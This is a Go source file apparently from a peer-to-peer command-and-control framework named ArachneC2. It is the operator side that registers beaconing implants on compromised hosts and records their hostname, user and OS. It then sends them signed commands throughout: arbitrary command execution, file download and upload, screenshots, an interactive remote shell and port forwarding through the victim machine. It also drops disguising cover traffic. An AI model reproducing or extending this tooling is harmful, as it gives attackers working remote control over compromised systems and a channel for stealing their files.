package core

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
	ws "github.com/libp2p/go-libp2p/p2p/transport/websocket"
	"google.golang.org/protobuf/proto"
	"golang.org/x/term"

	"github.com/portbuster1337/ArachneC2/pkg/cryptography"
	"github.com/portbuster1337/ArachneC2/pkg/transport"
	apb "github.com/portbuster1337/ArachneC2/protobuf/apb"
)

type ImplantRecord struct {
	Name        string
	Hostname    string
	UUID        string
	Username    string
	UID         string
	GID         string
	OS          string
	Arch        string
	PID         int32
	PeerID      string
	Version     string
	ActiveC2    string
	Locale      string
	LastCheckin time.Time
	Interval    time.Duration
	Jitter      time.Duration
	PublicKey   crypto.PubKey
	Disconnected bool
}

type Operator struct {
	keys        *cryptography.OperatorKey
	node        *transport.Node
	messenger   *transport.Messenger
	implants    map[string]*ImplantRecord
	mu          sync.RWMutex
	ctx         context.Context
	cancel      context.CancelFunc
	socksProxies map[int]*SocksInstance
	socksMu     sync.Mutex
}

func NewOperator(ctx context.Context, keys *cryptography.OperatorKey, relayAddrs []string) (*Operator, error) {
	ctx, cancel := context.WithCancel(ctx)

	nodeCfg := transport.NodeConfig{
		ListenAddr:     "/ip4/0.0.0.0/tcp/0/ws",
		BootstrapPeers: transport.DefaultBootstrapAddrs(),
		EnableRelay:    true,
		EnableMDNS:     true,
		EnableDHT:      true,
		RelayAddrs:     relayAddrs,
		PrivateKey:     keys.PrivateKey,
	}

	node, err := transport.NewNode(ctx, nodeCfg,
		libp2p.NoTransports,
		libp2p.Transport(ws.New),
		libp2p.Transport(tcp.NewTCPTransport),
	)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("create node: %w", err)
	}

	o := &Operator{
		keys:         keys,
		node:         node,
		implants:     make(map[string]*ImplantRecord),
		socksProxies: make(map[int]*SocksInstance),
		ctx:          ctx,
		cancel:       cancel,
	}

	o.messenger = transport.NewOperatorMessenger(ctx, node, keys)
	o.messenger.SetOperatorID(keys.PeerID)
	o.messenger.SetHandler(o.handleMessage)

	return o, nil
}

func (o *Operator) Start() error {
	log.Printf("[operator] PeerID: %s", o.node.ID().String())
	log.Printf("[operator] Command topic: %s", o.messenger.CommandTopic())
	log.Printf("[operator] Beacon topic: %s", o.messenger.BeaconTopic())

	o.node.SetStreamHandler(transport.BeaconProtocolID, o.handleBeaconStream)

	if err := o.node.StartDiscovery(); err != nil {
		return fmt.Errorf("discovery: %w", err)
	}

		ns := o.messenger.RendezvousString()
		if o.node.DHT != nil {
			go func() {
				for o.node.DHT.RoutingTable().Size() == 0 {
					select {
					case <-o.ctx.Done():
						return
					case <-time.After(2 * time.Second):
					}
				}
				for o.node.Advertise(o.ctx, ns) != nil {
					select {
					case <-o.ctx.Done():
						return
					case <-time.After(10 * time.Second):
					}
				}
				for {
					o.node.Advertise(o.ctx, ns)
					select {
					case <-o.ctx.Done():
						return
					case <-time.After(30 * time.Second):
					}
				}
			}()

		go o.discoverPeersLoop(ns)
	}

	if err := o.messenger.ListenBeacons(o.ctx); err != nil {
		return fmt.Errorf("listen beacons: %w", err)
	}

	go o.disconnectCheckLoop()

	return nil
}

func (o *Operator) disconnectCheckLoop() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			o.mu.Lock()
			now := time.Now()
			for id, rec := range o.implants {
				if rec.Disconnected {
					continue
				}
				timeout := rec.Interval + rec.Jitter + 30*time.Second
				if now.Sub(rec.LastCheckin) > timeout {
					rec.Disconnected = true
					o.implants[id] = rec
					log.Printf("[operator] implant DISCONNECTED: %s@%s peer=%s (no beacon for %v)",
						rec.Name, rec.Hostname, id, now.Sub(rec.LastCheckin).Round(time.Second))
				}
			}
			o.mu.Unlock()
		case <-o.ctx.Done():
			return
		}
	}
}

func (o *Operator) discoverPeersLoop(ns string) {
	for {
		peerCh, err := o.node.FindPeers(o.ctx, ns)
		if err != nil {
			log.Printf("[operator] DHT find peers: %v", err)
			select {
			case <-o.ctx.Done():
				return
			case <-time.After(30 * time.Second):
			}
			continue
		}

		for pi := range peerCh {
			if pi.ID == o.node.ID() || len(pi.Addrs) == 0 {
				continue
			}
			log.Printf("[operator] discovered peer %s via DHT", pi.ID.String())
		}

		select {
		case <-o.ctx.Done():
			return
		case <-time.After(60 * time.Second):
		}
	}
}

func (o *Operator) handleMessage(ctx context.Context, env *apb.Envelope, senderPub crypto.PubKey) {
	switch env.Type {
	case transport.MsgTypeRegister:
		o.handleBeaconRegister(env)
	case transport.MsgTypeCover:
		// cover traffic silently dropped
	case transport.MsgTypePs:
		o.handlePsResult(env)
	case transport.MsgTypeLs:
		o.handleLsResult(env)
	case transport.MsgTypeExecute:
		o.handleExecuteResult(env)
	case transport.MsgTypeCd:
		o.handleCdResult(env)
	case transport.MsgTypePwd:
		o.handlePwdResult(env)
	case transport.MsgTypeDownload:
		o.handleDownloadResult(env)
	case transport.MsgTypeUpload:
		o.handleUploadResult(env)
	case transport.MsgTypeScreenshot:
		o.handleScreenshotResult(env)
	case transport.MsgTypeKill:
		o.handleKillResult(env)
	default:
		log.Printf("[operator] received message type=%d", env.Type)
	}
}

func (o *Operator) handleBeaconStream(s network.Stream) {
	defer s.Close()
	remotePeer := s.Conn().RemotePeer()
	for {
		var msgLen uint32
		if err := binary.Read(s, binary.LittleEndian, &msgLen); err != nil {
			errStr := err.Error()
			if errStr != "EOF" && !strings.Contains(errStr, "reset") && !strings.Contains(errStr, "closed") {
				log.Printf("[operator] beacon stream read len: %v", err)
			}
			return
		}
		if msgLen > 1<<20 {
			log.Printf("[operator] beacon stream message too large: %d", msgLen)
			return
		}
		data := make([]byte, msgLen)
		if _, err := io.ReadFull(s, data); err != nil {
			log.Printf("[operator] beacon stream read data: %v", err)
			return
		}
		env := &apb.Envelope{}
		if err := proto.Unmarshal(data, env); err != nil {
			log.Printf("[operator] beacon stream unmarshal: %v", err)
			continue
		}
		var pubKey crypto.PubKey
		if len(env.SenderKey) > 0 {
			pubKey, _ = transport.PubKeyFromEnvelope(env)
			senderID, err := peer.IDFromPublicKey(pubKey)
			if err != nil || senderID != remotePeer {
				log.Printf("[operator] beacon stream sender mismatch")
				continue
			}
		}
		if err := transport.VerifyEnvelope(env, pubKey); err != nil {
			log.Printf("[operator] beacon stream invalid signature: %v", err)
			continue
		}
		o.handleMessage(o.ctx, env, pubKey)
	}
}

func (o *Operator) handleBeaconRegister(env *apb.Envelope) {
	if o.messenger.IsReplay(env.ID) {
		log.Printf("[operator] dropped replay beacon id=%d", env.ID)
		return
	}

	beaconReg := &apb.Z1{}
	if err := proto.Unmarshal(env.Data, beaconReg); err != nil {
		log.Printf("[operator] unmarshal beacon register: %v", err)
		return
	}

	reg := beaconReg.Register
	if reg == nil {
		log.Printf("[operator] beacon register missing Register field")
		return
	}

	pubKey, err := transport.PubKeyFromEnvelope(env)
	if err != nil {
		log.Printf("[operator] get sender key from envelope: %v", err)
		return
	}

	if err := transport.VerifyEnvelope(env, pubKey); err != nil {
		log.Printf("[operator] dropped beacon — invalid signature: %v", err)
		return
	}

	peerID, err := peer.IDFromPublicKey(pubKey)
	if err != nil {
		log.Printf("[operator] peer id from sender key: %v", err)
		return
	}
	peerIDStr := peerID.String()

	rec := &ImplantRecord{
		Name:        reg.Name,
		Hostname:    reg.Hostname,
		UUID:        reg.UUID,
		Username:    reg.Username,
		UID:         reg.UID,
		GID:         reg.GID,
		OS:          reg.OS,
		Arch:        reg.Arch,
		PID:         reg.PID,
		PeerID:      peerIDStr,
		Version:     reg.Version,
		ActiveC2:    reg.ActiveC2,
		Locale:      reg.Locale,
		LastCheckin: time.Now(),
		Interval:    time.Duration(beaconReg.Interval) * time.Second,
		Jitter:      time.Duration(beaconReg.Jitter) * time.Second,
		PublicKey:   pubKey,
	}

	o.mu.Lock()
	if existing, ok := o.implants[peerIDStr]; ok {
		existing.LastCheckin = time.Now()
		existing.Disconnected = false
		existing.Hostname = reg.Hostname
		existing.Username = reg.Username
		existing.OS = reg.OS
		existing.Arch = reg.Arch
	} else {
		o.implants[peerIDStr] = rec
		log.Printf("[operator] new implant registered: %s@%s [%s/%s] peer=%s",
			reg.Name, reg.Hostname, reg.OS, reg.Arch, peerIDStr)
	}
	o.mu.Unlock()

	o.messenger.AddKnownImplant(peerIDStr, pubKey)
}

func (o *Operator) ListImplants() []*ImplantRecord {
	o.mu.RLock()
	defer o.mu.RUnlock()

	ids := make([]string, 0, len(o.implants))
	for id := range o.implants {
		ids = append(ids, id)
	}
	sort.Strings(ids)

	out := make([]*ImplantRecord, 0, len(o.implants))
	for _, id := range ids {
		out = append(out, o.implants[id])
	}
	return out
}

func (o *Operator) GetImplant(peerID string) *ImplantRecord {
	o.mu.RLock()
	defer o.mu.RUnlock()
	return o.implants[peerID]
}

func (o *Operator) sendCommandToImplant(implantPeerID string, msgType uint32, msg proto.Message) error {
	pid, err := peer.Decode(implantPeerID)
	if err != nil {
		return fmt.Errorf("decode peer id %s: %w", implantPeerID, err)
	}

	data, err := proto.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	env := o.messenger.CreateEnvelope(msgType, data)
	signingData, err := transport.EnvelopeSigningBytes(env)
	if err != nil {
		return fmt.Errorf("signing bytes: %w", err)
	}
	sig, err := o.keys.PrivateKey.Sign(signingData)
	if err != nil {
		return fmt.Errorf("sign: %w", err)
	}
	env.Signature = sig
	pubBytes, err := crypto.MarshalPublicKey(o.keys.PrivateKey.GetPublic())
	if err == nil {
		env.SenderKey = pubBytes
	}

	ctx, cancel := context.WithTimeout(o.ctx, 10*time.Second)
	defer cancel()
	ctx = network.WithAllowLimitedConn(ctx, "command")

	s, err := o.node.NewStream(ctx, pid, transport.CmdProtocolID)
	if err != nil {
		return fmt.Errorf("open command stream: %w", err)
	}
	defer s.Close()

	envData, err := proto.Marshal(env)
	if err != nil {
		return fmt.Errorf("marshal envelope: %w", err)
	}

	if err := binary.Write(s, binary.LittleEndian, uint32(len(envData))); err != nil {
		return fmt.Errorf("write len: %w", err)
	}
	if _, err := s.Write(envData); err != nil {
		return fmt.Errorf("write data: %w", err)
	}

	return nil
}

func (o *Operator) Ps(implantPeerID string) error {
	req := &apb.Z12{}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePs, req)
}

func (o *Operator) Ping(implantPeerID string) error {
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePing, &apb.Ping{})
}

func (o *Operator) Ls(implantPeerID string, path string) error {
	req := &apb.Z16{Path: path}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeLs, req)
}

func (o *Operator) Execute(implantPeerID string, cmd string, args []string) error {
	req := &apb.Z14{
		Path:   cmd,
		Args:   args,
		Output: true,
	}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeExecute, req)
}

func (o *Operator) handlePsResult(env *apb.Envelope) {
	result := &apb.Z13{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal ps result: %v", err)
		return
	}
	log.Printf("[operator] ps result: %d processes", len(result.Processes))
	for _, p := range result.Processes {
		log.Printf("  %d: %s (owner: %s)", p.Pid, p.Name, p.Owner)
	}
}

func (o *Operator) handleLsResult(env *apb.Envelope) {
	result := &apb.Z17{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal ls result: %v", err)
		return
	}
	log.Printf("[operator] ls %s: %d entries", result.Path, len(result.Files))
	for _, f := range result.Files {
		dir := " "
		if f.IsDir {
			dir = "d"
		}
		log.Printf("  %s %s (%d bytes)", dir, f.Name, f.Size)
	}
}

func (o *Operator) handleExecuteResult(env *apb.Envelope) {
	result := &apb.Z15{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal execute result: %v", err)
		return
	}
	log.Printf("[operator] execute result: status=%d stdout=%d bytes stderr=%d bytes",
		result.Status, len(result.Stdout), len(result.Stderr))
	if len(result.Stdout) > 0 {
		fmt.Println(string(result.Stdout))
	}
	if len(result.Stderr) > 0 {
		fmt.Fprintf(os.Stderr, "%s\n", string(result.Stderr))
	}
}

func (o *Operator) handleCdResult(env *apb.Envelope) {
	result := &apb.Z21{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal cd result: %v", err)
		return
	}
	if result.Response != nil && result.Response.Err != 0 {
		fmt.Printf("cd error: %s\n", result.Response.ErrMsg)
	} else {
		fmt.Printf("cd: %s\n", result.Path)
	}
}

func (o *Operator) handlePwdResult(env *apb.Envelope) {
	result := &apb.Z21{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal pwd result: %v", err)
		return
	}
	fmt.Println(result.Path)
}

func (o *Operator) handleScreenshotResult(env *apb.Envelope) {
	result := &apb.Z3{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal screenshot result: %v", err)
		return
	}
	if result.Response != nil && result.Response.Err != 0 {
		fmt.Printf("screenshot error: %s\n", result.Response.ErrMsg)
	} else {
		fmt.Printf("screenshot: %d bytes (saving not implemented)\n", len(result.Data))
	}
}

func (o *Operator) handleDownloadResult(env *apb.Envelope) {
	result := &apb.Z23{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal download result: %v", err)
		return
	}
	if !result.Exists {
		fmt.Printf("download: file does not exist\n")
		return
	}
	if result.Response != nil && result.Response.Err != 0 {
		fmt.Printf("download error: %s\n", result.Response.ErrMsg)
		return
	}
	path := result.Path
	if path == "" {
		path = "downloaded"
	}
	if err := os.WriteFile(path, result.Data, 0644); err != nil {
		fmt.Printf("download: write %s: %v\n", path, err)
		return
	}
	fmt.Printf("downloaded %s (%d bytes)\n", path, len(result.Data))
}

func (o *Operator) handleUploadResult(env *apb.Envelope) {
	result := &apb.Z25{}
	if err := proto.Unmarshal(env.Data, result); err != nil {
		log.Printf("[operator] unmarshal upload result: %v", err)
		return
	}
	if result.Response != nil && result.Response.Err != 0 {
		fmt.Printf("upload error: %s\n", result.Response.ErrMsg)
		return
	}
	fmt.Printf("uploaded %d bytes to %s\n", result.BytesWritten, result.Path)
}

func (o *Operator) handleKillResult(env *apb.Envelope) {
	log.Printf("[operator] implant confirmed kill")
	fmt.Println("implant kill confirmed")
}

func (o *Operator) Cd(implantPeerID string, path string) error {
	req := &apb.Z19{Path: path}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeCd, req)
}

func (o *Operator) Pwd(implantPeerID string) error {
	req := &apb.Z20{}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePwd, req)
}

func (o *Operator) Download(implantPeerID string, path string) error {
	req := &apb.Z22{Path: path}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeDownload, req)
}

func (o *Operator) Upload(implantPeerID string, path string, data []byte) error {
	req := &apb.Z24{
		Path:      path,
		Data:      data,
		Overwrite: true,
	}
	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeUpload, req)
}

type shellEscaper struct {
	r       io.Reader
	escaped bool
}

func (e *shellEscaper) Read(p []byte) (int, error) {
	if e.escaped {
		return 0, fmt.Errorf("shell escape")
	}
	n, err := e.r.Read(p)
	if n > 0 {
		for i := 0; i < n; i++ {
			if p[i] == 0x1d { // Ctrl+]
				e.escaped = true
				return 0, fmt.Errorf("shell escape")
			}
		}
	}
	return n, err
}

func (o *Operator) OpenShell(implantPeerID string) error {
	pid, err := peer.Decode(implantPeerID)
	if err != nil {
		return fmt.Errorf("decode peer id %s: %w", implantPeerID, err)
	}

	ctx, cancel := context.WithTimeout(o.ctx, 15*time.Second)
	defer cancel()
	ctx = network.WithAllowLimitedConn(ctx, "shell")

	s, err := o.node.NewStream(ctx, pid, transport.ShellProtocolID)
	if err != nil {
		return fmt.Errorf("open shell stream to %s: %w", implantPeerID, err)
	}
	defer s.Close()

	rows, cols, err := term.GetSize(int(os.Stdin.Fd()))
	if err != nil {
		rows, cols = 30, 120
	}
	if err := binary.Write(s, binary.LittleEndian, uint16(rows)); err != nil {
		return fmt.Errorf("send rows: %w", err)
	}
	if err := binary.Write(s, binary.LittleEndian, uint16(cols)); err != nil {
		return fmt.Errorf("send cols: %w", err)
	}

	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return fmt.Errorf("raw terminal: %w", err)
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	errCh := make(chan error, 2)

	go func() {
		_, err := io.Copy(s, &shellEscaper{r: os.Stdin})
		errCh <- err
	}()
	go func() {
		_, err := io.Copy(os.Stdout, s)
		errCh <- err
	}()

	<-errCh
	fmt.Println() // newline after shell exits
	return nil
}

func (o *Operator) Portfwd(implantPeerID string, localPort int, target string) error {
	pid, err := peer.Decode(implantPeerID)
	if err != nil {
		return fmt.Errorf("decode peer id %s: %w", implantPeerID, err)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return fmt.Errorf("listen 127.0.0.1:%d: %w", localPort, err)
	}
	defer listener.Close()

	log.Printf("[operator] portfwd: forwarding 127.0.0.1:%d -> %s via %s", localPort, target, implantPeerID)

	for {
		localConn, err := listener.Accept()
		if err != nil {
			return err
		}

		go func() {
			defer localConn.Close()

			pctx, pcancel := context.WithTimeout(o.ctx, 15*time.Second)
			defer pcancel()
			pctx = network.WithAllowLimitedConn(pctx, "portfwd")

			s, err := o.node.NewStream(pctx, pid, transport.PortfwdProtocolID)
			if err != nil {
				log.Printf("[operator] portfwd stream: %v", err)
				return
			}
			defer s.Close()

			if _, err := fmt.Fprintf(s, "%s\n", target); err != nil {
				log.Printf("[operator] portfwd send target: %v", err)
				return
			}

			go io.Copy(s, localConn)
			io.Copy(localConn, s)
		}()
	}
}

func (o *Operator) Close() error {
	o.cancel()
	return o.node.Close()
}
